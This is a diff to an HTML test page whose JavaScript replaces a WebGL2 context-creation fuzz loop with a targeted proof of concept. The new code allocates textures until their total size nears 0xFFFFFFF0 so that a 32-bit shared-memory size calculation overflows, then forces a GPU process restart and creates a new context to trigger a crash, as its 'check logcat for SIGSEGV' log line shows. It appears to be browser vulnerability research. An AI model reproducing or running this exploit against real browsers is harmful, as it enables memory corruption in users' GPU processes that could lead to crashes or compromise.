@@ -4,33 +4,71 @@
 <pre id="log"></pre>
 <script>
 (async function() {
-  const log = (msg) => { document.getElementById('log').textContent += msg + '\n'; };
-  // Try many different canvas sizes and context creation attributes
-  for (let w = 1; w <= 16384; w *= 2) {
-    for (let h = 1; h <= 16384; h *= 2) {
-      const attributes = [
-        {powerPreference: 'high-performance'},
-        {powerPreference: 'low-power'},
-        {desynchronized: true},
-        {preserveDrawingBuffer: true},
-        {failIfMajorPerformanceCaveat: false},
-        {xrCompatible: true}
-      ];
-      for (const attr of attributes) {
-        try {
-          const canvas = new OffscreenCanvas(w, h);
-          const gl = canvas.getContext('webgl2', attr);
-          if (!gl) continue;
-          gl.clear(gl.COLOR_BUFFER_BIT);
-          gl.flush();
-          log(`Created ${w}x${h} with ${JSON.stringify(attr)}`);
-          // Quick destroy to trigger channel teardown and recreation
-          canvas.width = 0;
-        } catch(e) {}
-      }
+  const log = (msg) => document.getElementById('log').textContent += msg + '\n';
+
+  const canvas = new OffscreenCanvas(256, 256);
+  const gl = canvas.getContext('webgl2', { powerPreference: 'high-performance' });
+  if (!gl) return log('WebGL2 not supported');
+
+  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+  const texSize = Math.min(maxSize, 4096); // 64 MB per texture
+  const bytesPerTex = texSize * texSize * 4;
+  log(`Texture size: ${texSize}x${texSize}, bytes: ${bytesPerTex}`);
+
+  // Total shared memory header size is 8 bytes.
+  // We want (total + 8) to wrap to a small value (e.g., 0x10).
+  // So total = 0x100000000 - 8 + 0x10 = 0x100000008, but 32-bit truncation gives 8.
+  // We'll aim for total = 0xFFFFFFF8 (wraps to 0 with +8, but better target 0xFFFFFFF0 to wrap to 8).
+  const targetTotal = 0xFFFFFFF0;
+  let totalBytes = 0;
+  const textures = [];
+
+  // Allocate textures until we are just below the target
+  while (totalBytes < targetTotal - bytesPerTex) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, texSize, texSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+    textures.push(tex);
+    totalBytes += bytesPerTex;
+    if (textures.length % 10 === 0) log(`Allocated ${textures.length} textures, total ${(totalBytes/1024/1024).toFixed(0)} MB`);
+  }
+
+  // Fine-tune: allocate a smaller texture to hit exactly targetTotal
+  const remaining = targetTotal - totalBytes;
+  if (remaining > 0 && remaining < bytesPerTex) {
+    const smallSize = Math.floor(Math.sqrt(remaining / 4));
+    if (smallSize > 0) {
+      const tex = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D, tex);
+      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, smallSize, smallSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+      textures.push(tex);
+      totalBytes += smallSize * smallSize * 4;
+      log(`Fine-tuned with ${smallSize}x${smallSize}, total now ${totalBytes} bytes (0x${totalBytes.toString(16)})`);
     }
   }
-  log('All combinations tried – chec logcat');
+  log(`Final total: ${totalBytes} bytes (0x${totalBytes.toString(16)})`);
+
+  // Force a new GPU process to be spawned – the browser will pass this total as the pool size
+  const loseExt = gl.getExtension('WEBGL_lose_context');
+  if (loseExt) {
+    loseExt.loseContext();
+    log('Context lost, waiting for GPU process restart...');
+  }
+
+  // After restart, create a new context to trigger the allocation with the wrapped size
+  setTimeout(() => {
+    log('Creating new context...');
+    const newCanvas = new OffscreenCanvas(1, 1);
+    const newGl = newCanvas.getContext('webgl2', { powerPreference: 'high-performance' });
+    if (newGl) {
+      const tex = newGl.createTexture();
+      newGl.bindTexture(newGl.TEXTURE_2D, tex);
+      newGl.texImage2D(newGl.TEXTURE_2D, 0, newGl.RGBA, 1, 1, 0, newGl.RGBA, newGl.UNSIGNED_BYTE, null);
+      log('New context created – check logcat for SIGSEGV');
+    } else {
+      log('New context creation failed – GPU process likely crashed');
+    }
+  }, 2000);
 })();
 </script>
 </body>
